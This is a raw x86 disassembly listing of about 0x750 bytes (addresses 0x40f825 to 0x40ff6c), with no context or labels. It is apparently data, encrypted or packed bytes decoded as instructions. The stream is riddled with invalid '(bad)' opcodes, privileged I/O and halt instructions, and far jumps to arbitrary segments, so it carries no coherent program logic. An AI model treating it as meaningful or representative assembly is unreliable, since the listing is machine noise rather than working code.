  40f825:	ss dec ecx
  40f827:	fs xor eax,0x2b510a1b
  40f82d:	loop   0x40f862
  40f82f:	adc    eax,0x68b768af
  40f834:	ret    0x3476
  40f837:	arpl   WORD PTR [ebp-0x4d3882d5],si
  40f83d:	xchg   esi,eax
  40f83e:	push   0x23
  40f840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f841:	sbb    al,0x35
  40f843:	mov    esp,0x3d7f3cd9
  40f848:	icebp  
  40f849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f84a:	xchg   esi,eax
  40f84b:	(bad)
  40f850:	out    0x6e,al
  40f852:	cmp    BYTE PTR [eax],cl
  40f854:	mov    edx,eax
  40f856:	sub    DWORD PTR [edx],0xc4f984dc
  40f85c:	pop    ss
  40f85d:	fabs   
  40f85f:	and    esi,esi
  40f861:	iret   
  40f862:	pushf  
  40f863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f864:	jae    0x40f837
  40f866:	sub    DWORD PTR [esi],eax
  40f868:	ins    BYTE PTR es:[edi],dx
  40f869:	adc    bp,0x451
  40f86e:	aad    0xf4
  40f870:	loopne 0x40f829
  40f872:	sub    DWORD PTR [edi-0x15],ecx
  40f875:	(bad)  
  40f876:	pop    ss
  40f877:	leave  
  40f878:	sbb    DWORD PTR [ebx],esp
  40f87a:	inc    eax
  40f87b:	aad    0xb0
  40f87d:	in     eax,dx
  40f87e:	jecxz  0x40f8a4
  40f880:	push   ss
  40f881:	hlt    
  40f882:	gs call 0xc8cd:0xbe5dcdd1
  40f88a:	lods   al,BYTE PTR cs:[esi]
  40f88c:	adc    eax,0xc2c60287
  40f891:	mov    ch,0x74
  40f893:	lds    ebx,FWORD PTR [ecx-0x73442398]
  40f899:	pushf  
  40f89a:	outs   dx,BYTE PTR ds:[esi]
  40f89b:	imul   ebp,DWORD PTR [ecx+0x53],0xba1a8c35
  40f8a2:	retf   0xc719
  40f8a5:	sbb    DWORD PTR [ebx-0x101c6a6b],ecx
  40f8ab:	cmp    eax,0x4b8150b7
  40f8b0:	adc    ecx,DWORD PTR [eax-0x36f45de8]
  40f8b6:	push   ecx
  40f8b7:	(bad)  
  40f8b8:	fldcw  WORD PTR [ebx-0x62deb074]
  40f8be:	jecxz  0x40f8c1
  40f8c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c1:	imul   esp,DWORD PTR gs:[eax],0x72
  40f8c5:	arpl   WORD PTR [eax-0x62d66d63],di
  40f8cb:	scas   al,BYTE PTR es:[edi]
  40f8cc:	push   ss
  40f8cd:	je     0x40f909
  40f8cf:	fbld   TBYTE PTR gs:[ebp-0x78eebe4c]
  40f8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d7:	mov    al,ds:0x1ae641f3
  40f8dc:	int    0x1a
  40f8de:	outs   dx,DWORD PTR ds:[esi]
  40f8df:	mov    eax,0x3b160b00
  40f8e4:	cdq    
  40f8e5:	out    dx,al
  40f8e6:	add    cl,al
  40f8e8:	and    dl,0x3c
  40f8eb:	push   ebx
  40f8ec:	mov    ds,WORD PTR [ecx]
  40f8ee:	cdq    
  40f8ef:	jge    0x40f8f3
  40f8f1:	xchg   ebx,eax
  40f8f2:	int    0x6a
  40f8f4:	dec    ecx
  40f8f5:	dec    ebx
  40f8f6:	cmp    al,0x4a
  40f8f8:	adc    eax,DWORD PTR [esi]
  40f8fa:	mov    ds:0xafff5da2,eax
  40f8ff:	jg     0x40f91f
  40f901:	dec    ecx
  40f902:	mov    cl,0xb0
  40f904:	repnz adc DWORD PTR [edx],edi
  40f907:	cld    
  40f908:	pop    esp
  40f909:	mov    edi,0x1c83a532
  40f90e:	pop    ebx
  40f90f:	and    ecx,ecx
  40f911:	xchg   esp,eax
  40f912:	xchg   ebx,eax
  40f913:	aaa    
  40f914:	pop    edi
  40f915:	lds    ebx,FWORD PTR [ebp+edi*4+0x5c]
  40f919:	mov    ch,0xc4
  40f91b:	mov    bh,BYTE PTR [ebp-0x14]
  40f91e:	adc    esi,ebx
  40f920:	mov    dh,0x5f
  40f922:	fs lahf 
  40f924:	mov    dl,0x81
  40f926:	shr    BYTE PTR [edx+0x25f808df],1
  40f92c:	mov    dh,0xda
  40f92e:	mov    edx,0x7e6d58c9
  40f933:	shl    DWORD PTR [ebx-0x11],cl
  40f936:	test   eax,0xe3ee7828
  40f93b:	mov    ah,0x4b
  40f93d:	ds or  ah,dl
  40f940:	nop
  40f941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f942:	fstp   TBYTE PTR [edx]
  40f944:	out    0xbb,eax
  40f946:	hlt    
  40f947:	dec    edi
  40f948:	inc    ebp
  40f949:	jo     0x40f918
  40f94b:	ins    BYTE PTR es:[edi],dx
  40f94c:	sbb    al,BYTE PTR [ecx+0x68b048bc]
  40f952:	scas   eax,DWORD PTR es:[edi]
  40f953:	xchg   ebx,eax
  40f954:	mov    ebp,0x5c4de5fc
  40f959:	push   esp
  40f95a:	shr    ebp,1
  40f95c:	dec    eax
  40f95d:	fisubr WORD PTR [ebx-0x75]
  40f960:	mov    al,ds:0x17b2f213
  40f965:	xor    ch,cl
  40f967:	shl    DWORD PTR [esi+0x36],0xa7
  40f96b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f96c:	or     dh,BYTE PTR [ecx-0x62]
  40f96f:	inc    eax
  40f970:	fimul  WORD PTR ds:0x846a451c
  40f976:	jne    0x40f96e
  40f978:	jl     0x40f944
  40f97a:	adc    eax,0xc5ce80d0
  40f97f:	bound  esi,QWORD PTR [ebp+0x6c86f3ef]
  40f985:	pop    ebp
  40f986:	push   0xfbf709da
  40f98b:	test   edi,edx
  40f98d:	or     BYTE PTR [eax-0x5b],bh
  40f990:	repz mov ebx,DWORD PTR [esi+edx*1+0x1093f37e]
  40f998:	call   0xf545ed92
  40f99d:	push   esp
  40f99e:	sbb    dl,0x44
  40f9a1:	jle    0x40f925
  40f9a3:	fcmovne st,st(0)
  40f9a5:	gs push esp
  40f9a7:	aam    0xc
  40f9a9:	(bad)  
  40f9ab:	mov    eax,0x39005fc4
  40f9b0:	(bad)  
  40f9b2:	aas    
  40f9b3:	mov    ah,0xa2
  40f9b5:	int3   
  40f9b6:	jo     0x40f9e8
  40f9b8:	dec    esi
  40f9b9:	dec    ebx
  40f9ba:	sub    al,0x87
  40f9bc:	jno    0x40f96e
  40f9be:	dec    esi
  40f9bf:	iret   
  40f9c0:	je     0x40f94d
  40f9c2:	or     edx,DWORD PTR [edx-0x4072a357]
  40f9c8:	dec    edx
  40f9c9:	cmp    DWORD PTR [eax],ebx
  40f9cb:	out    0x31,eax
  40f9cd:	mov    ds:0xa136119a,eax
  40f9d2:	adc    ch,dh
  40f9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9d5:	stos   BYTE PTR es:[edi],al
  40f9d6:	es pop ebx
  40f9d8:	adc    al,0xa6
  40f9da:	cmp    al,al
  40f9dc:	icebp  
  40f9dd:	push   ds
  40f9de:	add    al,0xc9
  40f9e0:	(bad)  [esi-0x71]
  40f9e3:	lds    edx,FWORD PTR [ebx-0x17]
  40f9e6:	loope  0x40fa25
  40f9e8:	dec    ecx
  40f9e9:	into   
  40f9ea:	jle    0x40f9ef
  40f9ec:	out    dx,eax
  40f9ed:	cli    
  40f9ee:	nop
  40f9ef:	sbb    al,BYTE PTR [eax]
  40f9f1:	(bad)  
  40f9f2:	dec    ebx
  40f9f3:	jmp    0x40fa21
  40f9f5:	pushf  
  40f9f6:	das    
  40f9f7:	lock xchg esp,eax
  40f9f9:	shr    ah,0x6d
  40f9fc:	and    ebp,DWORD PTR [esi+0x46]
  40f9ff:	ret    0x5f57
  40fa02:	and    BYTE PTR [edi],ah
  40fa04:	int3   
  40fa05:	in     al,0x6e
  40fa07:	into   
  40fa08:	sub    bh,0x1a
  40fa0b:	cdq    
  40fa0c:	mov    eax,ds:0x807b0765
  40fa11:	push   cs
  40fa12:	ja     0x40f9ff
  40fa14:	fild   DWORD PTR ds:0x88196cf4
  40fa1a:	pushf  
  40fa1b:	pop    ebp
  40fa1c:	ficom  WORD PTR [ebx-0x8]
  40fa1f:	stc    
  40fa20:	xchg   edi,eax
  40fa21:	pusha  
  40fa22:	iret   
  40fa23:	sub    al,0x87
  40fa25:	adc    ch,bh
  40fa27:	scas   eax,DWORD PTR es:[edi]
  40fa28:	sbb    DWORD PTR [ebx],ecx
  40fa2a:	dec    edx
  40fa2b:	dec    ecx
  40fa2c:	add    ah,BYTE PTR [ebx]
  40fa2e:	lods   eax,DWORD PTR ds:[esi]
  40fa2f:	imul   esp,DWORD PTR ds:[edi+0x6054ce53],0xffffff8b
  40fa37:	mov    ds:0xdcd1dda4,eax
  40fa3c:	xchg   esp,eax
  40fa3d:	xor    DWORD PTR [ecx-0x50cb8bea],0xffffffdb
  40fa44:	adc    BYTE PTR ss:[edi],0x23
  40fa48:	cmp    DWORD PTR [edx-0x7cafd66b],edi
  40fa4e:	aad    0xed
  40fa50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa51:	jl     0x40fa89
  40fa53:	(bad)  [ebx]
  40fa55:	imul   edx,edi,0xffffffee
  40fa58:	fwait
  40fa59:	push   ds
  40fa5a:	or     BYTE PTR [edi+0x4b],ch
  40fa5d:	adc    ebp,DWORD PTR [esi-0x42abcd6f]
  40fa63:	mov    esp,0x73b1bf4a
  40fa68:	ins    DWORD PTR es:[edi],dx
  40fa69:	enter  0x304c,0xef
  40fa6d:	xchg   ah,bl
  40fa6f:	es sbb al,0x33
  40fa72:	mov    ecx,fs
  40fa74:	call   0x2b27:0xf199ccc5
  40fa7b:	clc    
  40fa7c:	outs   dx,BYTE PTR ds:[esi]
  40fa7d:	jmp    0x40fac5
  40fa7f:	(bad)  
  40fa80:	or     eax,DWORD PTR [ecx+0x66b2b16e]
  40fa86:	pop    esp
  40fa87:	push   ebp
  40fa88:	push   eax
  40fa89:	adc    al,dh
  40fa8b:	mov    bl,0x37
  40fa8d:	pusha  
  40fa8e:	cmp    ah,0xea
  40fa91:	xchg   edx,eax
  40fa92:	jecxz  0x40fa96
  40fa94:	retf   0xe373
  40fa97:	addr16 inc esi
  40fa99:	ins    BYTE PTR es:[edi],dx
  40fa9a:	sub    DWORD PTR [ecx+edx*1+0x20],ebp
  40fa9e:	add    esi,DWORD PTR [edi]
  40faa0:	mov    bh,0xf2
  40faa2:	lds    ebp,FWORD PTR [ebx+0x51261cd4]
  40faa8:	hlt    
  40faa9:	bound  esi,QWORD PTR [eax-0x6d33da2a]
  40faaf:	imul   edx,DWORD PTR [ebx-0x72],0x6d
  40fab3:	sbb    al,0xb6
  40fab5:	repz sbb al,0xaf
  40fab8:	mov    cl,0xc5
  40faba:	ins    DWORD PTR es:[edi],dx
  40fabb:	iret   
  40fabc:	sbb    BYTE PTR [esp+ebp*1-0x28],bh
  40fac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fac1:	dec    esp
  40fac2:	(bad)  
  40fac3:	lahf   
  40fac4:	sub    edi,DWORD PTR [ebp-0x2e933e39]
  40faca:	mov    DWORD PTR ds:0xcbacd03f,edi
  40fad0:	adc    edi,ecx
  40fad2:	addr16 jmp edi
  40fad5:	sub    al,0x4a
  40fad7:	popa   
  40fad8:	mov    al,ds:0xe1b46178
  40fadd:	dec    ebp
  40fade:	test   DWORD PTR [ecx+0x58],edx
  40fae1:	or     dl,BYTE PTR [ebp-0x6e]
  40fae4:	cmp    DWORD PTR [ecx],ecx
  40fae6:	push   esp
  40fae7:	sbb    bh,dh
  40fae9:	push   bp
  40faeb:	mov    db3,edi
  40faee:	jle    0x40fb12
  40faf0:	je     0x40fa8e
  40faf2:	xor    ecx,edi
  40faf4:	aam    0x32
  40faf6:	rol    DWORD PTR [edi+0x643978b1],0x17
  40fafd:	shr    bh,cl
  40faff:	fsub   DWORD PTR [eax+eax*2-0x6644115c]
  40fb06:	and    edi,edi
  40fb08:	outs   dx,DWORD PTR ds:[esi]
  40fb09:	push   0xfb255c5d
  40fb0e:	imul   ebx,DWORD PTR [ecx-0x5e],0xa0d20727
  40fb15:	sbb    BYTE PTR [esi+0x347ed78d],0x97
  40fb1c:	xchg   esi,eax
  40fb1d:	or     eax,0x915ca7e4
  40fb22:	sub    al,0x1c
  40fb24:	loopne 0x40fafd
  40fb26:	std    
  40fb27:	cmp    BYTE PTR cs:[ecx],al
  40fb2a:	fdivr  DWORD PTR [edi+eax*4+0x40b33db0]
  40fb31:	pop    esp
  40fb32:	add    dh,al
  40fb34:	mov    al,0x84
  40fb36:	add    BYTE PTR [ebp+0x60efe460],bh
  40fb3c:	pushf  
  40fb3d:	popf   
  40fb3e:	int3   
  40fb3f:	cmp    al,0x5
  40fb41:	loopne 0x40fb3b
  40fb43:	push   cs
  40fb44:	pop    esi
  40fb45:	das    
  40fb46:	add    BYTE PTR [esi+0x18],0x18
  40fb4a:	mov    ch,0xbb
  40fb4c:	call   0x4664:0xafbc3ba5
  40fb53:	lods   eax,DWORD PTR ds:[esi]
  40fb54:	sub    ebp,DWORD PTR [ebx+0x71]
  40fb57:	dec    eax
  40fb58:	and    eax,0xdac09bcd
  40fb5d:	loopne 0x40fb66
  40fb5f:	mov    al,0xd3
  40fb61:	dec    ecx
  40fb62:	mov    ?,esi
  40fb64:	outs   dx,DWORD PTR ds:[esi]
  40fb65:	push   eax
  40fb66:	cmp    ch,BYTE PTR ds:0x2e655a09
  40fb6c:	or     dl,BYTE PTR [edx+0x38]
  40fb6f:	scas   al,BYTE PTR es:[edi]
  40fb70:	jbe    0x40fb06
  40fb72:	fucomp st(1)
  40fb74:	lea    ecx,[ecx]
  40fb76:	inc    ecx
  40fb77:	and    dh,BYTE PTR [edi+0x340826a4]
  40fb7d:	mov    al,ds:0xff582146
  40fb82:	dec    eax
  40fb83:	mov    esp,ebx
  40fb85:	xchg   BYTE PTR [ebx+ecx*2-0x2a],al
  40fb89:	ret    0x5d8d
  40fb8c:	push   eax
  40fb8d:	push   ds
  40fb8e:	mov    ecx,0xcf34734
  40fb93:	fmul   QWORD PTR [esi]
  40fb95:	jae    0x40fb2c
  40fb97:	shl    DWORD PTR [eax+edi*2],1
  40fb9a:	mov    al,0xe9
  40fb9c:	cli    
  40fb9d:	or     DWORD PTR [ebp-0x5a],edx
  40fba0:	xchg   ecx,eax
  40fba1:	cli    
  40fba2:	mov    esi,0x3906cf80
  40fba7:	outs   dx,BYTE PTR ds:[esi]
  40fba8:	xor    esp,DWORD PTR [eax+esi*4+0x73b7b69e]
  40fbaf:	test   eax,0x63d73b5f
  40fbb4:	mov    ds:0x67ed69f5,al
  40fbb9:	add    eax,0xc405f8d0
  40fbbe:	xchg   edx,eax
  40fbbf:	fld    TBYTE PTR [edi+0x7a9a6709]
  40fbc5:	test   DWORD PTR ds:0x3498dae3,0x9881d90f
  40fbcf:	or     BYTE PTR [ebp-0x1b848850],ah
  40fbd5:	out    0x9c,al
  40fbd7:	sbb    eax,0xe50f7707
  40fbdc:	xor    BYTE PTR [esi+ebx*8-0x5fd7d214],bl
  40fbe3:	push   esi
  40fbe4:	cmp    DWORD PTR [edi+0x4],0x11ded8ab
  40fbeb:	mov    bh,0xed
  40fbed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbee:	dec    ebp
  40fbef:	xor    DWORD PTR [ebp-0x3e],ecx
  40fbf2:	adc    BYTE PTR [ecx+0x231f163f],bh
  40fbf8:	and    BYTE PTR [edx+0x576da505],al
  40fbfe:	fmul   DWORD PTR [ebp+0x77]
  40fc01:	data16 fst QWORD PTR [edx]
  40fc04:	jl     0x40fbca
  40fc06:	leave  
  40fc07:	call   0x17e7:0x4d830209
  40fc0e:	push   eax
  40fc0f:	jae    0x40fc5a
  40fc11:	ja     0x40fbbd
  40fc13:	std    
  40fc14:	xchg   ebp,eax
  40fc15:	push   ss
  40fc16:	(bad)  
  40fc17:	mov    esp,0x3c25738a
  40fc1c:	es (bad) 
  40fc1e:	cwde   
  40fc1f:	push   edi
  40fc20:	loop   0x40fc03
  40fc22:	aad    0x7e
  40fc24:	and    al,0x61
  40fc26:	cmp    al,0x9e
  40fc28:	push   ds
  40fc29:	pop    edx
  40fc2a:	or     dh,BYTE PTR [esi-0x5e]
  40fc2d:	sbb    edx,DWORD PTR [edx]
  40fc2f:	push   ebp
  40fc30:	jnp    0x40fc6e
  40fc32:	mul    BYTE PTR [ecx]
  40fc34:	(bad)  
  40fc35:	lods   al,BYTE PTR ds:[esi]
  40fc36:	cmp    DWORD PTR [edx-0x5e],esp
  40fc39:	inc    esp
  40fc3a:	scas   al,BYTE PTR es:[edi]
  40fc3b:	mov    al,ds:0x9cf718dd
  40fc40:	(bad)  
  40fc41:	fstp   QWORD PTR [edi]
  40fc43:	daa    
  40fc44:	sub    al,al
  40fc46:	enter  0x92d4,0xa6
  40fc4a:	dec    eax
  40fc4b:	mov    ebx,0x9f92111d
  40fc50:	mov    bh,0xba
  40fc52:	mov    eax,0x8125a2b7
  40fc57:	aas    
  40fc58:	or     edi,DWORD PTR [esi]
  40fc5a:	outs   dx,DWORD PTR ds:[esi]
  40fc5b:	jno    0x40fc8d
  40fc5d:	aam    0x74
  40fc5f:	ins    DWORD PTR es:[edi],dx
  40fc60:	retf   0x181e
  40fc63:	or     al,0xd2
  40fc65:	hlt    
  40fc66:	push   es
  40fc67:	dec    ecx
  40fc68:	push   cs
  40fc69:	and    al,0x39
  40fc6b:	rcr    DWORD PTR [edi-0x31bf2390],1
  40fc71:	xchg   ebx,eax
  40fc72:	neg    ebp
  40fc74:	sbb    BYTE PTR [ecx+0x3519936c],ah
  40fc7a:	sbb    BYTE PTR [ecx-0x2f],0x32
  40fc7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc7f:	(bad)  
  40fc80:	gs inc ebp
  40fc82:	mov    esp,0xf9a0749a
  40fc87:	shl    DWORD PTR [edx-0xa],1
  40fc8a:	dec    ebx
  40fc8b:	add    cl,BYTE PTR [ecx-0x79]
  40fc8e:	je     0x40fc92
  40fc90:	mov    esp,0x839d66a7
  40fc95:	popa   
  40fc96:	(bad)
  40fc9a:	mov    al,ds:0x3c8054f1
  40fc9f:	repnz push cs
  40fca1:	mov    ch,BYTE PTR [ebx+ecx*2-0x5c]
  40fca5:	lahf   
  40fca6:	rcl    BYTE PTR [edx+0x22],0xc8
  40fcaa:	aad    0x74
  40fcac:	add    BYTE PTR [ecx+0x28],dl
  40fcaf:	scas   al,BYTE PTR es:[edi]
  40fcb0:	fidivr WORD PTR [edi-0x43]
  40fcb3:	jp     0x40fd17
  40fcb5:	cmp    eax,0x6b3ddca
  40fcba:	jmp    0xefbb4a64
  40fcbf:	mov    ebx,0xaa93579f
  40fcc4:	adc    BYTE PTR [eax-0x3d],dh
  40fcc7:	mov    esi,0x7ec729b7
  40fccc:	sub    esp,eax
  40fcce:	int3   
  40fccf:	dec    esi
  40fcd0:	adc    bh,bh
  40fcd2:	xchg   edi,eax
  40fcd3:	sti    
  40fcd4:	in     eax,0xfa
  40fcd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcd7:	add    edi,DWORD PTR [eax+0x2c24b177]
  40fcdd:	jns    0x40fd2e
  40fcdf:	pop    ss
  40fce0:	rcr    BYTE PTR [edi],1
  40fce2:	push   cs
  40fce3:	inc    ecx
  40fce4:	iret   
  40fce5:	dec    esi
  40fce6:	cmp    al,0xef
  40fce8:	mov    ds:0x922b63a4,al
  40fced:	xchg   edi,eax
  40fcee:	and    cl,ch
  40fcf0:	scas   eax,DWORD PTR es:[edi]
  40fcf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf2:	popa   
  40fcf3:	xor    bl,ch
  40fcf5:	mov    WORD PTR [edx-0x5d],cs
  40fcf8:	sub    eax,DWORD PTR [edi]
  40fcfa:	out    0x7d,al
  40fcfc:	jmp    0x626f:0xbc39ee5a
  40fd03:	push   0x13
  40fd05:	clc    
  40fd06:	sub    DWORD PTR [edx],ebp
  40fd08:	pop    esp
  40fd09:	or     ebx,edx
  40fd0b:	ret    0x2022
  40fd0e:	mov    eax,ds:0x9e5f2bbe
  40fd13:	xor    al,0x99
  40fd15:	mov    DWORD PTR [edi+eiz*2-0x5f4353a3],0xe62cdc77
  40fd20:	xor    bl,dl
  40fd22:	xor    DWORD PTR [eax-0x5873d4a4],ebx
  40fd28:	(bad)  
  40fd29:	xor    eax,0x1ef1a35e
  40fd2e:	stos   DWORD PTR es:[edi],eax
  40fd2f:	lock pop esp
  40fd31:	xchg   DWORD PTR [eax-0x5dab2ea9],esi
  40fd37:	jne    0x40fcc8
  40fd39:	lods   eax,DWORD PTR ds:[esi]
  40fd3a:	je     0x40fd7b
  40fd3c:	fcom   QWORD PTR [esi]
  40fd3e:	retf   
  40fd3f:	push   es
  40fd40:	int    0x4a
  40fd42:	pop    ebp
  40fd43:	lahf   
  40fd44:	iret   
  40fd45:	dec    ecx
  40fd46:	daa    
  40fd47:	sar    DWORD PTR [esp+ebx*2+0x5c],1
  40fd4b:	ins    BYTE PTR es:[edi],dx
  40fd4c:	jns    0x40fd68
  40fd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd4f:	sub    ebx,ebx
  40fd51:	or     al,0x1a
  40fd53:	test   BYTE PTR [edx+0x7cb91d43],dh
  40fd59:	or     al,0x37
  40fd5b:	xchg   ah,ch
  40fd5d:	push   edx
  40fd5e:	gs mov eax,0xe9762e74
  40fd64:	mov    al,ds:0x2f7b2e48
  40fd69:	ins    DWORD PTR es:[edi],dx
  40fd6a:	sbb    al,0xea
  40fd6c:	scas   eax,DWORD PTR es:[edi]
  40fd6d:	adc    ah,BYTE PTR [ebx+0x40]
  40fd70:	(bad)  
  40fd71:	int    0x4c
  40fd73:	xchg   edi,eax
  40fd74:	sbb    al,BYTE PTR [eax]
  40fd76:	fnstenv [edx+0x7d3a18b]
  40fd7c:	push   ecx
  40fd7d:	outs   dx,DWORD PTR ds:[esi]
  40fd7e:	sbb    DWORD PTR [edx-0x50],edi
  40fd81:	nop
  40fd82:	inc    ecx
  40fd83:	jbe    0x40fd11
  40fd85:	pusha  
  40fd86:	cdq    
  40fd87:	dec    edi
  40fd88:	push   ebx
  40fd89:	test   edi,0x412b70a8
  40fd8f:	sbb    cl,BYTE PTR [ebx]
  40fd91:	push   edx
  40fd92:	push   0x52
  40fd94:	fs mov dh,0xef
  40fd97:	es inc esp
  40fd99:	jmp    DWORD PTR [ebx-0x5886661c]
  40fd9f:	inc    edx
  40fda0:	jo     0x40fd3d
  40fda2:	leave  
  40fda3:	sbb    eax,DWORD PTR [esi+eiz*1]
  40fda6:	push   0xedfc5e25
  40fdab:	mov    dh,0x87
  40fdad:	test   DWORD PTR [ebp-0x161adc84],0x233a7e6f
  40fdb7:	into   
  40fdb8:	pop    ds
  40fdb9:	repz dec ebx
  40fdbb:	cli    
  40fdbc:	in     al,0xa9
  40fdbe:	cmp    ecx,DWORD PTR [edx+0x7]
  40fdc1:	jae    0x40fd6c
  40fdc3:	scas   eax,DWORD PTR es:[edi]
  40fdc4:	shl    BYTE PTR [ebp+0x72],1
  40fdc7:	mov    dl,0xe8
  40fdc9:	inc    esp
  40fdca:	mov    esi,0xdf11af0
  40fdcf:	sub    ebp,edi
  40fdd1:	inc    esi
  40fdd2:	and    DWORD PTR [ebp-0x60],edi
  40fdd5:	inc    esp
  40fdd6:	inc    ebx
  40fdd7:	inc    ebx
  40fdd8:	xchg   esp,eax
  40fdd9:	jg     0x40fd77
  40fddb:	(bad)  
  40fddd:	mov    esp,0x168c944f
  40fde2:	inc    ebp
  40fde3:	cmp    eax,0x9d643e52
  40fde8:	mov    ch,0xae
  40fdea:	repz jbe 0x40fdcb
  40fded:	fidiv  WORD PTR [eax]
  40fdef:	mov    ecx,0x57ef914d
  40fdf4:	xchg   BYTE PTR [ebx-0x6da75ba9],bl
  40fdfa:	sahf   
  40fdfb:	xchg   ebp,eax
  40fdfc:	scas   al,BYTE PTR es:[edi]
  40fdfd:	lods   al,BYTE PTR ds:[esi]
  40fdfe:	pop    ebx
  40fdff:	test   eax,0x1708488b
  40fe04:	add    al,0x61
  40fe06:	cmp    bl,BYTE PTR ds:0x8f72529b
  40fe0c:	push   ds
  40fe0d:	xchg   ebx,eax
  40fe0e:	adc    edi,DWORD PTR [ebx-0x67d829f0]
  40fe14:	out    0x5b,al
  40fe16:	call   0xfc31:0x677ea869
  40fe1d:	out    0x88,eax
  40fe1f:	(bad)  
  40fe20:	(bad)  [ebp-0x76e18f74]
  40fe26:	stc    
  40fe27:	dec    edx
  40fe28:	es dec ebx
  40fe2a:	bound  edx,QWORD PTR [ecx+0x783e98fe]
  40fe30:	test   BYTE PTR [edi],0xdd
  40fe33:	pop    ecx
  40fe34:	fcom   DWORD PTR [edi-0x4c]
  40fe37:	call   0x89bb:0x3bc1591f
  40fe3e:	xchg   esp,eax
  40fe3f:	pop    ss
  40fe40:	jno    0x40fe0e
  40fe42:	out    dx,eax
  40fe43:	xchg   DWORD PTR [esi+0x34ae7ade],ebp
  40fe49:	cmp    al,0x3a
  40fe4b:	mov    al,0x59
  40fe4d:	adc    al,0xd4
  40fe4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe50:	rcl    DWORD PTR gs:[ebp+0x12],cl
  40fe54:	inc    ecx
  40fe55:	mov    ebx,0x10367f9b
  40fe5a:	dec    ecx
  40fe5b:	mov    edi,DWORD PTR [esi-0x4b]
  40fe5e:	out    dx,al
  40fe5f:	icebp  
  40fe60:	mov    eax,ds:0x370a0dba
  40fe65:	push   eax
  40fe66:	sbb    eax,ebp
  40fe68:	test   DWORD PTR es:[esi],esp
  40fe6b:	js     0x40fe9c
  40fe6d:	ret    0x90b1
  40fe70:	jmp    0x5dbaeae
  40fe75:	in     al,0x65
  40fe77:	ror    DWORD PTR [edx],1
  40fe79:	sar    ah,0x9d
  40fe7c:	leave  
  40fe7d:	fimul  WORD PTR [di]
  40fe80:	dec    ecx
  40fe81:	jno    0x40fe97
  40fe83:	dec    edi
  40fe84:	mov    ebp,0xd413ce49
  40fe89:	imul   esp,edx,0x41
  40fe8c:	imul   esi,DWORD PTR [eax+0x72],0x57
  40fe90:	mov    eax,DWORD PTR [edx-0x7a0a8ae3]
  40fe96:	das    
  40fe97:	(bad)  
  40fe98:	mov    dh,0x90
  40fe9a:	call   0xf821da78
  40fe9f:	inc    edx
  40fea0:	call   0xa9e5:0x57da2521
  40fea7:	aam    0xc1
  40fea9:	xchg   esi,eax
  40feaa:	add    eax,0x244c5a4e
  40feaf:	add    DWORD PTR [edx+0x27eec8e1],edi
  40feb5:	cld    
  40feb6:	mov    cl,ah
  40feb8:	imul   edi,DWORD PTR [esi+0xf],0xd1d93ea4
  40febf:	mul    BYTE PTR [edx-0x22eb77ba]
  40fec5:	push   0x2acefd78
  40feca:	mov    bl,0xa6
  40fecc:	jecxz  0x40fe64
  40fece:	cs enter 0x2be1,0xf8
  40fed3:	lods   al,BYTE PTR ds:[esi]
  40fed4:	mov    eax,ecx
  40fed6:	ss xor eax,0xac08ab54
  40fedc:	hlt    
  40fedd:	mov    ds:0x5939f35a,eax
  40fee2:	inc    esp
  40fee3:	(bad)  
  40fee4:	xlat   BYTE PTR ds:[ebx]
  40fee5:	sti    
  40fee6:	jb     0x40ff41
  40fee8:	xchg   esp,eax
  40fee9:	scas   al,BYTE PTR es:[edi]
  40feea:	into   
  40feeb:	inc    ebp
  40feec:	jne    0x40feb5
  40feee:	sub    cl,bl
  40fef0:	add    ah,BYTE PTR [edx]
  40fef2:	adc    DWORD PTR [edi+0x42],0x10
  40fef6:	dec    esp
  40fef7:	(bad)  
  40fef8:	test   DWORD PTR ss:[eax+0x36],eax
  40fefc:	pop    ebp
  40fefd:	adc    al,0xde
  40feff:	icebp  
  40ff00:	add    DWORD PTR [edi+0xbe9eddf],eax
  40ff06:	mov    eax,0x69e821b0
  40ff0b:	sub    DWORD PTR [esi+0x7a],ecx
  40ff0e:	jmp    0x90c83e54
  40ff13:	xor    eax,0x87f239ba
  40ff18:	cli    
  40ff19:	loopne 0x40ff0e
  40ff1b:	cmp    DWORD PTR [eax+eiz*1+0x6fdd0bb5],ebp
  40ff22:	es mov cl,0x15
  40ff25:	pop    edx
  40ff26:	lds    edi,FWORD PTR [edx+0x8c5018d]
  40ff2c:	mov    ebp,ebp
  40ff2e:	jmp    0x4c31:0x5659ac72
  40ff35:	stc    
  40ff36:	cmp    eax,0x85ccb99b
  40ff3b:	jle    0x40ff43
  40ff3d:	pop    esi
  40ff3e:	mov    al,ds:0x8d94d06c
  40ff43:	sbb    ebx,DWORD PTR [ebp+0xdb02093]
  40ff49:	loopne 0x40fef1
  40ff4b:	mov    ch,0x6c
  40ff4d:	xchg   ebp,eax
  40ff4e:	xchg   BYTE PTR [esi+ebx*4],bh
  40ff51:	dec    ecx
  40ff52:	mov    BYTE PTR [bx],cl
  40ff55:	push   ebx
  40ff56:	sbb    BYTE PTR [edx],ah
  40ff58:	pop    edx
  40ff59:	mov    al,0x75
  40ff5b:	sahf   
  40ff5c:	pop    edi
  40ff5d:	cld    
  40ff5e:	pop    ds
  40ff5f:	sti    
  40ff60:	pusha  
  40ff61:	push   es
  40ff62:	scas   al,BYTE PTR es:[edi]
  40ff63:	xor    al,0x40
  40ff65:	loop   0x40ff7e
  40ff67:	leave  
  40ff68:	ins    DWORD PTR es:[edi],dx
  40ff69:	iret   
  40ff6a:	xchg   BYTE PTR [ebx],cl
  40ff6c:	xchg   edx,eax
